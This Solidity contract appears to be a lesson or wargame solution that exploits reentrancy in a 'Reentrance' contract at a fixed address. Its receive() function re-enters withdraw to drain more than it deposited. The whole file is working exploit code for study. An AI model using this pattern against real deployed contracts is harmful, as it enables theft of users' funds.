// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.12;

import {Reentrance} from "./L11__Reentrancy.sol";

contract L11_Caller__Reentrancy {
    address public reentrancyAddress =
        0x7Cc8C16EC851C920d93F4CF3547620889b91f793;

    Reentrance public reentrancy = Reentrance(payable(reentrancyAddress));

    uint256 initialContractBalance = 1000000000000000;

    bool doReentrancy = true;

    constructor() public payable {
        require(msg.value == initialContractBalance, "insufficient payment");

        (bool _success, ) = address(reentrancy).call{
            value: initialContractBalance
        }(abi.encodeWithSignature("donate(address)", address(this)));

        require(_success, "donation failed :(...");
    }

    function sendReentrantWithdraw() public {
        reentrancy.withdraw(initialContractBalance);
    }

    receive() external payable {
        if (doReentrancy) reentrancy.withdraw(initialContractBalance);
        doReentrancy = false;
    }
}
